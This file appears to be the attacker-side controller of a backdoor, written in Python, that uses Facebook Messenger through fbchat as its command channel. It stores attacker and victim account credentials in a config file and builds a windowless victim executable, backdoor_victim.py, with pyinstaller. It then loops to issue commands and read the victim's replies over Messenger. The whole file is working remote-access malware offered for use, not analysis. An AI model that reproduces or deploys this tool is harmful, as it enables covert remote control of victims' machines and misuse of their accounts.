import requests
import fbchat
import argparse
from fbchat.models import *
import os
import platform
class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

def connect_fb(sa,sp):
	client = fbchat.Client(sa,sp) 
	return client

def send_command(cl,va,com):
	friends = cl.searchForUsers(va)[0]	

	message_id = cl.send(fbchat.Message(text=com), thread_id=friends.uid, thread_type=ThreadType.USER)
	if message_id:
		print("Command sent successfully!")

def recv_resp(sa,sp,va):
	client = fbchat.Client(sa,sp)
	friends = client.searchForUsers(va)[0]
	cmd = client.fetchThreadMessages(thread_id=friends.uid, limit=1)
	# Since the message come in reversed order, reverse them
	print(cmd[0])


def set_conf(sa,sp,va,vp):
	with open('conf.txt','w') as f:
		f.write(va+'\n'+vp+"\n"+va+"\n"+vp)
def main():
	parser = argparse.ArgumentParser(description='Backdoor using FB')
	parser.add_argument('-sa','--serveractname',help="attacker 'fb' act name")
	parser.add_argument('-sp','--serveractpwd',help="attacker 'fb' act pwd")
	parser.add_argument('-va','--victimactname',help="victim 'fb' act name")
	parser.add_argument('-vp','--victimactpwd',help="victim 'fb' act name")
	args = parser.parse_args()
	sa =args.serveractname
	sp = args.serveractpwd
	va= args.victimactname
	vp= args.victimactpwd
	if platform.system() != "Windows":

		print (f"{bcolors.WARNING}[*] Configuring conf.txt and updating backdoor_victim.py..")
	else:
		print ("[*] Configuring conf.txt and updating backdoor_victim.py..")
	if args.serveractname and args.serveractpwd and args.victimactname and args.victimactpwd:
		if platform.system() != "Windows":
			print (f"{bcolors.WARNING}[*] Configuring conf.txt and updating backdoor_victim.py..")
		else:
			print ("[*] Configuring conf.txt and updating backdoor_victim.py..")
		set_conf(sa,sp,va,vp)
		if platform.system() != "Windows":
			print (f"{bcolors.WARNING}[*] Done Configuring conf.txt and updating backdoor_victim.py")
		else:
			print ("[*] Done Configuring conf.txt and updating backdoor_victim.py")

		cl = connect_fb(sa,sp)
		if platform.system() != "Windows":
			print(f"{bcolors.WARNING}[*] Finishing setting up payload..")
		else:
			print("[*] Finishing setting up payload..")

		os.system("pyinstaller -F  -w backdoor_victim.py")
		if platform.system() != "Windows":
			print(f"{bcolors.OKBLUE}[*] Done setting up payload..")
		else:
			print("[*] Done setting up payload..")
		while True:
			
			cmd = input("Enter Command >")
			#send_command(cl,va,cmd)
			recv_resp(sa,sp,va)
	else:
		if platform.system() != "Windows":
			print(f"{bcolors.FAIL}[*] One of the required fields not given")
		else:
			print("[*] One of the required fields not given")

main()